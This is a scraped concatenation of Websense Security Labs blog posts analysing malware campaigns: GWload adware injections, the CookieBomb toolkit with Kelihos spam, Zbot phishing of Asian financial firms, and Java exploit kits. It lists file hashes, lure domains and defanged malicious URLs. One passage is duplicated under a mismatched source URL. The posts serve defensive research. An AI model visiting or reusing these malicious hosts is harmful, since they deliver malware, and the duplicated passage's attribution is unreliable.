Browser Assistant) \nSHA1: 2ec3760fd906e8dfe827cdbf552b8786348b1121 , filename: Wwyqza.exe (CS Browser Assistant) \nSHA1: 868bc131566a670d9a27742f1f499f2e36107a33 , filename: 44286.crx (CS Browser Assistant) \nSHA1: ee311464e5cee2ea7be63a09a7bd8aaa470243aa , filename: 44286.xpi (CS Browser Assistant) \nSHA1: 9efbf2f1d28936e18b2a17cb853e8623f192e292 , filename: CS Browser Assistant 2.0-bho.dll (CS Browser Assistant) \n \nHere are the Registry modifications that suggest Browser Helper Objects, services, and toolbars: \n \nURLSearchHook: SweetIM ToolbarURLSearchHook Class - {EEE6C35D-6118-11DC-9C72-001320C79847} - C:\\Program Files\\SweetIM\\Toolbars\\Internet Explorer\\mgHelper.dll\n \nBHO: CrossriderApp0044286 - {11111111-1111-1111-1111-110411421186} - C:\\Program Files\\CS Browser Assistant 2.0\\CS Browser Assistant 2.0-bho.dll\n \nBHO: Updater By Sweetpacks Helper - {DEDAF650-12B8-48f5-A843-BBA100716106} - C:\\Program Files\\Updater By Sweetpacks\\Extension32.dll\n \nBHO: ShoppingChip - {EBFD7D4B-EF00-3F7D-A2C7-4C6C23DCAFAC} - C:\\Program Files\\ShoppingChip\\W.dll\n \nBHO: SWEETIE - {EEE6C35C-6118-11DC-9C72-001320C79847} - C:\\Program Files\\SweetIM\\Toolbars\\Internet Explorer\\mgToolbarIE.dll\n \nToolbar: SweetPacks Toolbar for Internet Explorer - {EEE6C35B-6118-11DC-9C72-001320C79847} - C:\\Program Files\\SweetIM\\Toolbars\\Internet Explorer\\mgToolbarIE.dll\n \nService: Updater By Sweetpacks - Unknown owner - C:\\Program Files\\Updater By Sweetpacks\\ExtensionUpdaterService.exe\n \n \nTo summarize this section, a significant amount of unexpected and unwanted software may have found its way to the user\'s machine, including: ShoppingChip, SweetIM\\SweetPacks, Amonetize Updater, CouponScout, Bprotector & CS Browser Assistant.  We hope there won\'t be more.\n \n \nHow the lure code operates, and relationship to rogue CPAlead campaigns on Facebook\n \nThe script that is loaded by an injected website with \'GWload\' also resides on an injected website and follows a two-stage process (related source code is demonstrated in the images below). The first stage is the \'locker page loader\' where steps are taken to prepare the browser to load the \'content locker page\'.  Among its various actions, it prepares the frame where the \'content locker page\' is going to reside and sets a cookie on the user\'s machine. At this stage, the script won\'t redirect to the \'content locker page\' and lock the website\'s content if there was no referrer set to the request.  This means that the \'content locker page\' will show and activate only if the user was referred from another website, such as a search engine result. If everything checks out at the first stage, then the \'content locker page\' is loaded, and it blocks the website\'s legitimate content from the user, permitting access only if \'VLC Media Player\' is downloaded and installed. Digging a bit deeper and looking for references in the code section \'gwloaded = false\' over the web shows that it\'s associated with tools that aim to evade browser-based \"Ad blockers\" software. In fact, the comments at the start of the script claim in plain sight that the script and its contents are the intellectual property of Adscend Media LLC. Adscend Media LLC is a company that was sued by Facebook; Facebook claimed that the company engaged in scam and fraudulent activity on the Facebook platform. A lot of the scams on Facebook employ social engineering tricks similar to this mass injection: they typically condition access to content if certain steps are executed by the user; conditions vary and may include filling out a survey or installing software. This model of on-line advertising is called \"Cost Per Action\" (CPA) or \"Pay Per Action\" (PPA), where the advertiser pays for each specified action commenced by the user.\n \nOnce the \'content locker page\' loads, it prompts the user to download the software with several links leading to the same location at trackergeo.com. This domain acts as a statistics collector; checking the Whois data for that website shows that it was registered by a zhang jing and with email address derqe43@qq.com; commencing a reverse Whois lookup on the email address reveals more domains that have a low reputation and that were registered ~14-20 days ago:\n \nfulllocalbabez.com\n nicelocalbabez.com\n shishang558.com\n malelocalbabez.com\n teng8teng8.com\n ownlocalbabez.com\n gxtopit.com\n lowlocalbabez.com\n okaylocalbabez.com\n xjjiaoy.com\n nulllocalbabez.com\n wiselocalbabez.com\n lizhengqu.com\n xjyinxiao88.com\n \n \ntrackergeo.com redirects to hxxp://www.winmediaplayer.com/direct-download.html?version=1.1.8.21&iaff1=10084&ci=3793&capp=MediaPlayer, which further redirects to download the installation file athxxp://www.askdownload.com/download.php?version=1.1.8.21&prefix=VLCMediaPlayer&campid=3793&capp=MediaPlayer&iaff1=10084.\n \nThe file downloaded named VLCMediaPlayer__3793_il256.exe (SHA1: 7e8593c36209afa8f065ac00aa3d3b40b738dc00) is the main file that starts the process of installing unwanted software, as we described in the previous section.

We noticed that this mass injection uses a social engineering trick that locks legitimate websites\' content to lure potential victims to install applications that participate in Cost Per Action (CPA) advertising schemes. This change in tactics that occurred in the past two weeks coincides with the arrest of the Blackhole Exploit Kit author \'Paunch,\' which could suggest that actors adapt to change rapidly to keep their attack going. It was also apparent that certain scripts used by actors to serve social engineering-based attack vectors are interchangeable across different attack platforms; we witnessed with \'GWload\' that code that mostly was used in social engineering-based attacks on Facebook has now migrated and is used with mass injections.\n\nWebsense customers are protected from injected websites and the different stages of this threat with our Advanced Classification Engine - ACE.', 'https://www.forcepoint.com/security-labs/gwload-social-engineering-based-mass-injection-making-its-rounds\n');

According to Websense Labs’ telemetry, this campaign has infected tens of thousands of legitimate websites across the web. The exploits themselves are widely varied and no single platform, CMS, or OS is uniquely targeted; rather, the toolkit appears to automatically target a multitude of known vulnerabilities, as well as classic bruteforcing attacks, across multiple surfaces.  The \"Malware Must Die!\" blog describes the early version of CookieBomb here.\n\n\n	Prehistoric Injections\n\n\n	When this campaign was first identified and investigated by Websense Labs’ analysts, the injections were without any kind of obfuscation, and instead relied on a fairly trivial, yet seemingly effective, method of avoiding static AV detection:\n\n\n	\n\n\n	This attack relies on the fact that no iFrame will be rendered until the appropriate JavaScript function is executed, therefore any generic detection targeting iFrames would be rendered ineffective. Of course, this type of injection campaign did not go unnoticed for long and, given its unique properties and structure, it was trivial to provide mitigation for this attack.\n\n\n	 \n\n\n	Within days of this structure being detected seemingly across the board, the authors shifted tactics and began to lightly obfuscate their code - this leads us to believe the initial campaign was merely an Alpha or Beta test of the toolkit.\n\n\n	 \n\n\n	The obfuscation, in addition to requiring emulation or similar, was also polymorphic, meaning no two injections resulted in the same obfuscated code. An example of the early obfuscation methods used by these threat actors:\n\n\n	 \n\n\n	 \n\n\n	Note: The screenshot was trimmed for space; the variable “z” is actually ~4,500+ characters long.\n\n\n	As is plain to see, this code looks radically different from the initial campaign, and therefore required a little reverse engineering to identify the code as a CookieBomb injection. The code above is designed specifically to frustrate analysis and subsequent detection-creation by the AV community; fortunately, for an experienced analyst, the code is not at all difficult to clean up and beautify:\n\n\n	\n\n\n	This decodes precisely into the plaintext code shown in the first image of this blog.\n\n\n	Modifying the obfuscated code\n\n\n	The plaintext code remained almost identical for a significant amount of time, by industry standards – it’s unusual to see identical code ITW (In The Wild) for longer than 24 hours. However this remained the code of choice, for these actors, for several months – indeed, we still see fresh injections which are either the plaintext or obfuscated version of this script. The toolkit, though, has forked into two distinct injections: one for .php scripts, the other for .htm(l) and .js scripts.\n\n\n	The .php injection attempts to avoid static detection by utilising the PHP method: echo – this is used to dynamically write the code to the page:\n\n\n	\n\n\n	Notice how the author needed to use substantial escape sequences in order for this code to function correctly.\n\n\n	The JavaScript and HTM(L) injections follow a similar pattern, but make use of classic injection methods (as no such method exists within JS or HTML):\n\n\n	\n\n\n	Exploit-chip Cookies\n\n\n	Throughout the injection campaign, regardless of the initial injection type used, the deobfuscated code had one particularly interesting, and consistent, characteristic: the setting of a very specific cookie:\n\n\n	\n\n\n	The last segment of code checks to ensure the browser has cookies enabled - it exits the if-block if they\'re not - it then checks to see if the cookie “visited_uq” is set to the value 55. If it’s not, it sets the cookie appropriately, finally calling the main function, gh09() in this case, which causes the iFrame to be written to the page and executed. When our browser is silently redirected to the iFrame source, a script on the other end checks to ensure that our browser has this session cookie set, using a built-in PHP superglobal variable $_COOKIE. If the appropriate variable is set, depending upon the script used, the browser will either be redirected, again, to another link in the chain, or passed to a script within the same domain – until recently, these would have been part of the Blackhole Exploit Kit (BHEK), covered in-depth here. Once this kit executes, the victim would have had any number of pieces of malware installed on their machine, including, but not limited to: ZeroAccess, Zeus and its clones, Reveton, and various other generic Ransomware kits.\n\n\n	Cookies and Spam\n\n\n	Around the middle of October 2013, Websense ThreatSeeker Network detected a small number of spam messages purporting to offer users products to support and increase their libido:\n\n\n	\n\n\n	The body of the message was very simple, plaintext:\n\n\n	\n\n\n	This mail is quite clearly spam, however, what is really interesting is the various artifacts within the header itself, specifically this little snippet:\n\n\n	\n\n\n	This is a very clear indicator that the source of this message is a spambot or script. When looked over with an experienced eye, it becomes apparent this email may just have come from the Kelihos botnet.\n\n\n	Firstly, let us take a look at the content of the URL within one of these spam messages:\n\n\n	 Note: This is extracted from a different URL, as its structure lends itself to easier viewing.\n\n\n	This HTML is hideously malformed and one would expect it not to render in a browser. However, as is evident in the following screenshot, it does, albeit a little on the ugly side:\n\n\n	\n\n\n	When this page is loaded into a browser, two things will happen. Firstly, the browser will silently redirect to the iFrame source which is decoded from the obfuscated code present at the head of the script. The browser will then overtly redirect to the spam site via the following code:\n\n\n	\n\n\n	This site is classic med-spam, which offers the victim not only their choice in sexual performance-enhancing drugs, but also of having their bank accounts drained by the malicious actors who would receive such details:\n\n\n	\n\n\n	And the accompanying protocol errors:\n\n\n	\n\n\n	If we take a look at the redirection process in a session debugger, we see that the attempt to redirect to the malicious site fails to load with a 502 response, which is a classic way for a server hosting an Exploit Kit to reject connections from nodes on its blacklists. When a redirect does successfully render (which has yet to occur in the latest incarnation of this campaign), we are no longer redirected to the BHEK – due almost certainly to the recent arrest of its author, Paunch. It appears there’s a migration to other EKs (such as Styx), currently in progress. In the meantime, however, the current URLs, which pointed to BHEK, are, seemingly, refusing all connections:\n\n\n	\n\n\n	Success breeds success\n\n\n	After an eventual, successful redirect and exploitation attempt, the user is served up a classic, generic downloader. This downloader grabs, amongst other things, another downloader, which attempts to grab a very suspect named set of binaries, from a number of IPs:\n\n\n	\n\n\n	Depending upon a number of variables, the IP queried will either serve a binary or, more likely, serve content such as this:\n\n\n	\n\n\n	Clearly, a fake 404 means either the binaries were removed from the host, or our checks did not pass validation and therefore our desired content was not served. Eventually, however, we got what we were looking for: in our case, we were served two encrypted certificates, masquerading as .htm files:\n\n\n	\n\n\n	\n\n\n	The contents of these samples are clearly encrypted:\n\n\n	\n\n\n	However, judging by the behavior of the sample when under debug, it’s most likely these are certificates for C&C communications. Once we’ve established a valid connection to one of our Motherships, we further obtain a binary, named in a similar convention to what we’ve seen above. Once executed, this bot reaches out to its peers, whose addresses are obtained via a hardcoded peer list embedded and encrypted within the bot itself. Once a connection is established, a new spam template is downloaded and loaded into memory – it’s at this point Kelihos begins to show its true nature as an advanced spam bot:\n\n\n	\n\n\n	The messages as they appear in Wireshark:\n\n\n	\n\n\n	As we can see, his message is incredibly similar to the spam message mentioned above and, indeed, when we view the source code at this URI:\n\n\n	\n\n\n	We can see it is of absolutely the same structure, even down to the malformed HTML. We can, therefore, reliably conclude these URLs are part of the same campaign.\n\n\n	Conclusion\n\n\n	Malware evolution is not new: indeed, since the days of Dark Avenger’s polymorphic engine, the Mutation Engine (MtE), obfuscation and evasion have been commonplace within most, if not all malware families. This blog aims to highlight how, in as little as 6 months, a simple tool for delivering Exploit Kits to end users has not only had its code radically altered, but has split into two distinct campaigns. One campaign is as mentioned above, infecting legitimate hosts via the exploitation of vulnerabilities; the other is arguably the most noteworthy – piggybacking on the Kelihos Botnet, which is an incredibly sophisticated and effective spam platform, as a means of exposing end users to EKs via blatantly malicious domains. Whether this tool was exclusively rented by/to the BHEK team, or whether in fact it was coded by them, remains to be seen.', 'https://www.forcepoint.com/blog/security-labs/evolution-cookiebomb-toolkit\n');

Once this kit executes, the victim would have had any number of pieces of malware installed on their machine, including, but not limited to: ZeroAccess, Zeus and its clones, Reveton, and various other generic Ransomware kits.\n\n\n	Cookies and Spam\n\n\n	Around the middle of October 2013, Websense ThreatSeeker Network detected a small number of spam messages purporting to offer users products to support and increase their libido:\n\n\n	\n\n\n	The body of the message was very simple, plaintext:\n\n\n	\n\n\n	This mail is quite clearly spam, however, what is really interesting is the various artifacts within the header itself, specifically this little snippet:\n\n\n	\n\n\n	This is a very clear indicator that the source of this message is a spambot or script. When looked over with an experienced eye, it becomes apparent this email may just have come from the Kelihos botnet.\n\n\n	Firstly, let us take a look at the content of the URL within one of these spam messages:\n\n\n	 Note: This is extracted from a different URL, as its structure lends itself to easier viewing.\n\n\n	This HTML is hideously malformed and one would expect it not to render in a browser. However, as is evident in the following screenshot, it does, albeit a little on the ugly side:\n\n\n	\n\n\n	When this page is loaded into a browser, two things will happen. Firstly, the browser will silently redirect to the iFrame source which is decoded from the obfuscated code present at the head of the script. The browser will then overtly redirect to the spam site via the following code:\n\n\n	\n\n\n	This site is classic med-spam, which offers the victim not only their choice in sexual performance-enhancing drugs, but also of having their bank accounts drained by the malicious actors who would receive such details:\n\n\n	\n\n\n	And the accompanying protocol errors:\n\n\n	\n\n\n	If we take a look at the redirection process in a session debugger, we see that the attempt to redirect to the malicious site fails to load with a 502 response, which is a classic way for a server hosting an Exploit Kit to reject connections from nodes on its blacklists. When a redirect does successfully render (which has yet to occur in the latest incarnation of this campaign), we are no longer redirected to the BHEK – due almost certainly to the recent arrest of its author, Paunch. It appears there’s a migration to other EKs (such as Styx), currently in progress. In the meantime, however, the current URLs, which pointed to BHEK, are, seemingly, refusing all connections:\n\n\n	\n\n\n	Success breeds success\n\n\n	After an eventual, successful redirect and exploitation attempt, the user is served up a classic, generic downloader. This downloader grabs, amongst other things, another downloader, which attempts to grab a very suspect named set of binaries, from a number of IPs:\n\n\n	\n\n\n	Depending upon a number of variables, the IP queried will either serve a binary or, more likely, serve content such as this:\n\n\n	\n\n\n	Clearly, a fake 404 means either the binaries were removed from the host, or our checks did not pass validation and therefore our desired content was not served. Eventually, however, we got what we were looking for: in our case, we were served two encrypted certificates, masquerading as .htm files:\n\n\n	\n\n\n	\n\n\n	The contents of these samples are clearly encrypted:\n\n\n	\n\n\n	However, judging by the behavior of the sample when under debug, it’s most likely these are certificates for C&C communications. Once we’ve established a valid connection to one of our Motherships, we further obtain a binary, named in a similar convention to what we’ve seen above. Once executed, this bot reaches out to its peers, whose addresses are obtained via a hardcoded peer list embedded and encrypted within the bot itself. Once a connection is established, a new spam template is downloaded and loaded into memory – it’s at this point Kelihos begins to show its true nature as an advanced spam bot:\n\n\n	\n\n\n	The messages as they appear in Wireshark:\n\n\n	\n\n\n	As we can see, his message is incredibly similar to the spam message mentioned above and, indeed, when we view the source code at this URI:\n\n\n	\n\n\n	We can see it is of absolutely the same structure, even down to the malformed HTML. We can, therefore, reliably conclude these URLs are part of the same campaign.\n\n\n	Conclusion\n\n\n	Malware evolution is not new: indeed, since the days of Dark Avenger’s polymorphic engine, the Mutation Engine (MtE), obfuscation and evasion have been commonplace within most, if not all malware families. This blog aims to highlight how, in as little as 6 months, a simple tool for delivering Exploit Kits to end users has not only had its code radically altered, but has split into two distinct campaigns. One campaign is as mentioned above, infecting legitimate hosts via the exploitation of vulnerabilities; the other is arguably the most noteworthy – piggybacking on the Kelihos Botnet, which is an incredibly sophisticated and effective spam platform, as a means of exposing end users to EKs via blatantly malicious domains. Whether this tool was exclusively rented by/to the BHEK team, or whether in fact it was coded by them, remains to be seen.', 'https://www.forcepoint.com/security-labs/massive-russian-cyber-criminal-campaign-targets-business-services-manufacturing\n');

The security paradigm is on a steep trajectory for continual change with challenges and obstacles. Our network speeds are increasing, data is migrating to the cloud, more data needs to be shared, and employees are bringing their devices to work.\n\nGiven the rapid change, we must upgrade our security posture to meet the challenges of today and tomorrow. The bad guys are playing a smarter game and thus we must transform the way our organizations behave. If you are responsible for modifying organizational behavior and increasing your security posture, here are five strategies:\n\n1. Transform Data into Intelligence\nDuring the legacy security paradigm you were urged to log everything, which meant you had BIG DATA about any and every security event that occurred in the ecosystem. Moving forward, your data must be transformed into intelligence while the enterprise needs to be aligned with data and context-centric security. Forensic intelligence will help you reconstruct activities, determine if an incident is in progress and provide network and systems usage baselines. For example, you will never make sense of a security breach without a complete record of every last packet after the fact. Armed with this intelligence, you can determine if the attackers merely infiltrated a system, versus exfiltrating confidential data. \n\n2. Subscribe to a Threat Modeling Culture\nIt is imperative to understand what threats can and will affect your organization to properly protect the correct assets. For example, examine how you can defend against advanced threats across all seven stages of the threat kill chain. How do you fare against insider threats and mobile device threats (tablets, laptops, smartphones, etc.)? Can you identify your enemy? Do you know your blind spots?\n\n3. Transform to the Next Generation Security Model\nRedefine the defense-in-depth approach to defense-in-context. Evolve your protection strategy from focusing on systems to focusing on the data itself. Below are three keys to this transformation:\n\nEnsure that your strategic security solutions are sharing the same information and intelligence. \n\nMigrate from monolithic point solutions to multi-staged or multi-domain solutions. It\'s a game of chess. You must have a multi-prong defense. Know your pieces on the board, how they move and never forget the object of the game-protecting your data. \n\nConsolidate commoditized solutions and use your funding for components that increase your posture. Evaluate your current investments by measuring their effectiveness and relevance. For example, it\'s time to reprioritize if results indicate the security tools are not aligned with the transition to a data-centric security model.\n4. Align Security Initiatives with Business Requirements\n Position security in the correct context-it\'s a business problem. \nSecurity initiatives and outcomes are often not aligned with business\ninitiatives. I cannot emphasize this enough. Sell the security program and\ncommunicate your successes internally. Demonstrate how you are saving the\ncompany money by preventing a data breach, reducing help desk tickets, enabling\nremote workers, etc. It will lead to increased buy-in and ultimately, funding. \n\n5. Develop a Culture of Security Inclusion and Accountability\n Transform your users from your greatest vulnerability to your volunteer security team. Show them what\'s in it for you, the company, and most importantly what\'s in it for them. Get their attention with frequent streamlined communications\n(newsletters, short videos, etc.). Develop programs that recognize and reward them for a job well done. Put methods in place to test your user-based posture, systems posture and track your progress. Remember, you can have the best technology and security program but without the user component you will find the improvement of your posture in a phase of stagnation.\n\nHave any questions about these five tips or any additional ideas?

Not only are there management changes afoot, but also changes in the company\'s vision for how we address current and emerging threats. It\'s that vision that drew me to Websense and in particular, to the Security Labs. The research team spans key disciplines that are absolutely necessary in creating proactive detection and response systems that act on threats throughout the multi-stage threat life cycle as well as new ways to visualize data and information.\nI strongly believe that timing is everything. I left a military career in 1991, shortly before the Internet entered the mainstream. I restarted my civilian life building and using QNX, a real-time platform that used cellular base stations and\npacketized data to locate vehicles using triangulation versus GPS. After three fulfilling years, I felt I was ready for a much larger challenge, thus began the next phase of my career. For the next four years, I had the opportunity to design and deploy cellular and wired carrier infrastructure for both Qwest and Geotek.\nIn 1999, I accepted a leadership role as CTO of Synergyx, a VoIP carrier, where I built and integrated a Linux-based, multi-tenant network management platform. To enable our company and resellers to manage their businesses more granularly and profitably, I merged this platform with web and IP architectures to form a single cohesive global platform. With this global visibility of IP networks and realizing the necessity of addressing anomalous and malicious traffic, my passion for network security was born.\nFollowing my experience at Synergyx, I joined Tarari, an Intel security hardware spin-off. Here I was able to help the company reach its goals by integrating its hardware solutions into platforms supported by companies such as Cisco, Nortel, 3Com and more than 75 other security vendors. Tarari was eventually acquired by LSI. Following the acquisition, I was brought on as the CTO of World Talk Radio where I helped restructure the company, specifically its technology and operations. Our efforts led to World Talk Radio being acquired by Modavox, Inc.\nAfter World Talk Radio\'s acquisition, I led the security research department for ESET for more than three years, followed by several years building and designing solutions for the intelligence community which was a challenging, rewarding endeavor and a major milestone in my career. During this time, I was able to satisfy my ongoing desire to learn and apply new technologies to solve some of the most vexing security problems.\n\nJoining Websense mid-year gave me the opportunity to begin leading the advanced threat research team toward delivering on expectations mapped out for the second half of 2013 through 2014. With my background in Agile development, software engineering, product management, security deployments and cybercrime research, I\'ll be prioritizing our projects and tasks to ensure we deliver on expectations and help the company reach its goals.', 'https://www.forcepoint.com/insights/meet-new-researchers-jeff-debrosse-joins-websense-security-labs\n');

Countries that were affected were the UAE, Pakistan and Nepal, but it\'s possible that other countries in the region were also targeted. The email messages were spoofing an email account that belongs to a remittance and currency exchange company. They were sent to recipients from the same company and a few other financial organizations in Asia.

Websense Cloud Email Security proactively blocked the messages, and the data was stored in the ThreatSeeker Intelligence Cloud for review.\nThe messages carried a zip attachment containing an executable that is a variant of the Trojan.Zbot.\nSo how is this campaign different?\nNormally, we see large-scale attacks sent using the Cutwail spambot, and the intended recipients are varied in location and industry.

The volume we see across the Websense ThreatSeeker Intelligence Cloud is tens of thousands or sometimes hundreds of thousands for each \"brand\" attack. In the small campaign we encountered, we saw about 10 instances and a few single references in non-delivery reports. All of the targets were related to the financial sector, and all were in Asia.\nThe small volume attack used plain text email with no attempt to clone the appearance of a known bank/financial organization (as is often done in large-scale attacks). The body of the message is simple and the grammar not very out of the ordinary. The subject is suspicious (notice the redundant zero):\n \nSubject: FW: Urgent Money transfer USD $52,1000\n \n\n\nThe zip attachment contains an executable file named:\nTransfer money.doc.exe:\n\n\nIf you look at the icon, you can see that it\'s not the typical fake MS Office or Adobe Reader type of icon that we normally see in large-scale attacks. In this case, it seems like the icon uses obfuscation to get around signature-based detection, not a new technique, but less common in typical large-scale attacks these days.\nThe malware itself is a variant of a common Trojan. We will review a few highlights later in the text to show the similarities.\n\nFor now, let\'s dig deeper into the email headers and see if we can get some additional information about the attack:\nAll the messages were being spoofed to appear to be coming from the same address (anonymized to protect customer information):\nxm@custdomain1\nThe logs in Websense Cloud Email Security show that the spoofing was identified:\n\"The sender address is probably forged since its domain is configured in Hosted Email Security but the sending relay is not associated with that domain\"\n\nWe had 10 messages, 1 non-delivery receipt (NDR), and one complaint from a recipient thinking custdomain1 was the actual address that sent them malware:\n\n\n\nAs we can see, the mail relays are all associated with hosting companies across multiple locations. So probably not much help there. When we examine the received lines in the headers, we can see that some have a user IP of 46.37.180.217 both on evirtualservers.net (Germany) and on ukfast.net (UK). However, checking that IP address leads to BurstNET Limited (UK), another hosting/cloud/data center company that has no direct connection to the attacks. A few messages appear to come through mail.altlastravels.com (atlastravels.com is a Travel company in India), which looks suspicious (notice the extra \"l\" added). Some messages had Anti-Abuse headers added. Let\'s see if they give us more info (the user names have been anonymized):\n\n\n\nWe can see that the attackers might have used a few compromised accounts of companies in India and Pakistan. We can see that one of the messages was also intended for another currency exchange/transfer company in the UAE.\nThe intended recipients we see are on custdomain1, custdomain2 (UAE), smartexchange.ae (UAE), mcb.com.pk (Pakistan) and prabhumoneytransfer.com.np (Nepal). All are involved in financial transactions, so the content of the email might appear relevant. In addition, the tool, a banking Trojan, fits the job.\nThis attack seems a lot more targeted than what we see from the threat actors that use Zbot in large scale, but the motive seems to be the same: use of common crimeware for monetary gain.\n\nMalicious Attachment Details\nOne of the most popular pieces of Crimeware,  the Trojan.Zbot, is frequently used in large-scale email attacks, either as attachments, or using URLs leading to exploit kits that ultimately drop Zbot on the victim\'s computer. Zbot can specifically target banking credentials and other personally identifiable information (PII).\nZbot (Zeus) source code was leaked in 2011, so it\'s quite easy for cyber criminals to compile new variants to get around many AV solutions, before they close the detection gap.\nAt the time of the attack, the executable was not previously seen in VirusTotal.com. A day later we tested and saw some minimal AV coverage via generic heuristics, 13/47:\nhttps://www.virustotal.com/en/file/8750c27c58467b1c05e9912ce80ecce524ff3c38/analysis/1378380234/\n\nHere\'s a summary of the Websense ThreatScope Analysis Report\n\n\n\nThe malware is requesting URLs that are already known to be related to Zbot in the past:\n\n \nIf we examine the behavior we can see created Mutexes* on shared memory, which have been associated with Zbot in the past:\ngcc-shmem-tdm2-use_fc_key (successful)\ngcc-shmem-tdm2-sjlj_once (successful)\ngcc-shmem-tdm2-fc_key (successful)\n* Mutex (Mutual Exclusions) are lock mechanisms used by software to control access to shared resources in order to prevent deadlock. They can be used to identify variants of known malware based on commonality. More on the subject can be found in this computer forensics blog on SANS.ORG\n \nThe attachment also drops a copy of itself in the user profile directory, and just as before, at the time of the attack, no VT info, a day later some minimal coverage, detection ratio 9/46:\nhttps://www.virustotal.com/en/file/f0937ba9cb179dfc8075e1b545e6fccb15a79d4bf784382be3d75a049884738f/analysis/1378380235/\n\nWebsense Protection\nSince the attack uses email attachments, it corresponds with some of the stages outlined in our white paper describing the 7 stages of Advanced Threats.\nLures - Websense Cloud Email Security provides proactive protection against email carrying executables or other suspicious attachments, based on multiple analytics: In this case, the built-in AV engine had generic detection, but in addition, the ThreatSeeker Intelligence Cloud would have quarantined the messages even without AV detection, based on several attributes.\nDropper File - Websense ThreatScope recognizes the malicious behavior of the dropper file, Websense ACE, our Advanced Classification Engine, offers protection against the executable.\nCall Home -ACE blocks the hosts associated with the call home functions.\nDropped Files - ACE protects against the URL hosts and blocks the files.\nData Theft - Websense DLP (data loss prevention) tools can detect and stop the exfiltration of sensitive information, like the banking credentials and PII that are targeted by Zbot.\n \n\nThanks to Victor Chin for helping with the binary analysis.', 'https://www.forcepoint.com/security-labs/low-volume-high-payoff-attacks-target-financial-services-industries-asia\n');

We surveyed millions of real-world web requests for Java usage through our global Websense ThreatSeeker Intelligence Cloud. \nNew Java Exploits and the Neutrino Exploit Kit\nNew Java exploits CVE-2013-2473 and CVE-2013-2463 are already making a big impact by targeting computers running outdated versions of Java. It\'s clear the cybercriminals know there is a Java update problem for many organizations.\nFor example, Websense ThreatSeeker Intelligence Cloud noticed an uptick in new hosts running the Neutrino exploit kit in the first and second weeks of August 2013. This could be attributed to Neutrino\'s addition of Java-based code execution exploits including CVE-2013-2463, which is based on AWT/2D vulnerabilities and affects all Java 6 users (tip of the hat to F-Secure). Typically associated with ransomware payloads, Neutrino is best known for its easy-to-use control panel and features that evade AV and IPS systems.\nForty percent of Java 6 users are vulnerable to these new exploits and there are no software patches in sight. Effective exploit kit delivery mechanisms, such as Neutrino, and unpatched vulnerabilities targeting Java 6 create a significant challenge for organizations that have not updated to Java 7.\nOn the positive side, our updated numbers show that enterprise IT is pushing out more Java updates. Earlier this year, 70 percent of Java requests came from Java 6 users. That figure has decreased to 40 percent.\nCheck out this previous blog post on how Java plays a part within the Seven Stages of Advanced Attacks and our advice on Java remediation steps at this post.\n\nDon\'t Forget About Flash\nRemember, just a few years ago, Flash was a primary attack vector. As our research above indicates, nearly 40 percent of users are not running the most up-to-date versions of Flash. In the last three months, five security patches have been released for Flash-and that number leaps to 26 over the course of the last year.\nThis is exactly why real-time security models are absolutely essential. Even the best patch management and traditional security tools simply cannot keep up with the ongoing barrage of zero-day attacks and exploit kits being created.\nWe\'ll keep you posted as we conduct ongoing and future research on these critical systems and programs.

Cybercriminals can rent a hosted exploit kit with zero-days already in it, for as little as $200 a week. Fast integration of zero-day vulnerabilities provides attackers with an unlimited capacity to reconstruct exploits that bypass traditional signature methods like antivirus, firewalls and other controls. Exploit kits have taken a complex and costly process and reduced the effort, expertise and cost previously required to take advantage of vulnerabilities. The barrier to entry for cybercriminals is now incredibly low. Well-made kits do almost all the work for you, right down to hosting the binary, if you choose.\nBlackhole, Cool, Gong da and Redkit are the exploits kits we see most frequently. Blackhole activity represents the biggest percentage of exploit activity we see, and for good reason. The owner of the Blackhole service is very adept at staying up-to-date with the most recent vulnerabilities, especially when it comes to Java zero-days. We have seen that this greatly increases the success of Java-related exploits. In fact, the Blackhole control panels our security researchers have cracked show a sizable disparity in Java exploit success versus other exploit types. Some studies suggest that Java exploits can represent nearly 80 percent of successful attacks perpetrated by Blackhole.\nSo how fast do exploit kits incorporate zero-days?\nJava vulnerability (CVE-2012-4681) was actually first discovered in the Gong da kit and incorporated into Blackhole within one week.\n  The Blackhole kit owners quickly incorporated the Java vulnerability (CVE-2013-0422) within one week of discovery.\n  The owner of the Blackhole and Cool kits also recently announced, \"We are setting aside a $100K budget to purchase browser and browser plug-in vulnerabilities, which are going to be used exclusively by us, without being released to public...\"\nThe more successful and highly managed exploit kits, like Cool and Blackhole, gradually retire older exploits and replace them with newer ones. However, our recent Websense Security Labs research illustrates that even less advanced exploit kits with a number of old exploits on hand can still prove successful. Based on our Java version research, at least theoretically, cybercriminals can use a three-year-old exploit and crack Java on nearly a third of endpoints.\nIn April, cybercriminals sought to take advantage of the horrific attacks at the Boston Marathon to infect computers using the RedKit Exploit Kit. Let\'s take a look at this campaign, intercepted by the Websense Security Labs, to understand how Java exploits are used in the Seven Stages of Advanced Threats. \nStage 1: Reconnaissance\nLike many other campaigns, in this example, the cybercriminals are opportunists looking to monitor news and breaking events for a chance to launch a successful attack. The bombings at the Boston Marathon provided the opportunity for this specific campaign.\nStage 2: Lures\nThe bad actors then generated a spam email campaign with sensational headlines to exploit human interest in learning more about the situation, including:\n2 Explosions at Boston Marathon\n  Aftermath to explosion at Boston Marathon\n  Boston Explosion Caught on Video\n  BREAKING - Boston Marathon Explosion\n  Runner captures. Marathon Explosion\n  Video of Explosion at the Boston Marathon\nStage 3: Redirects\nOnce the link is clicked, the victim is brought to a page with video coverage of the breaking event. Unbeknownst to them, a hidden iframe redirects them to an exploit page, in this case:\nhttp://<IP Address>/news.html\n  http://<IP Address>/boston.html\nStage 4: Exploit Kits\nThe RedKit Exploit Kit used in this attack scans for applicable vulnerabilities and in this occurrence, exploits an Oracle Java 7 Security Manager Bypass vulnerability (CVE-2013-0422) in order to deliver a file to the visitor\'s computer.\nStage 5: Dropper Files\nThis particular campaign used a non-standard dropper file, a downloader in the Win32/Waledac family to install two bots: Win32/Kelihos and Troj/Zbot.\nStage 6: Call Home\nFrom here, the machine notifies the bot herder and validates communications.\nStage 7: Data Theft\nIn what can be the most dangerous stage for businesses, the machine is now set for long-term data interception on the device, passing through the device or accessible by the device. This also can change the endpoint into a new platform for new attacks like the sending of unsolicited email or the unwilling participation in distributed denial of service (DDoS) attacks.\nUsing analytics to break the chain\nWhen you take the approach of looking at the entire attack chain for suspicious behavior, rather than waiting and hoping to catch something on the last step of the process, you have many more opportunities to spot and disrupt an attack - even if it\'s malware you\'ve never seen before.\nWith multiple analytics looking at every link in the threat chain, even zero-day attacks can be stopped.\nRather than looking for a single object, at a single point in time, companies must learn to review the entire threat chain and examine multiple opportunities to disrupt attacks.\nThis approach is much more effective at spotting and stopping attacks rather than simply 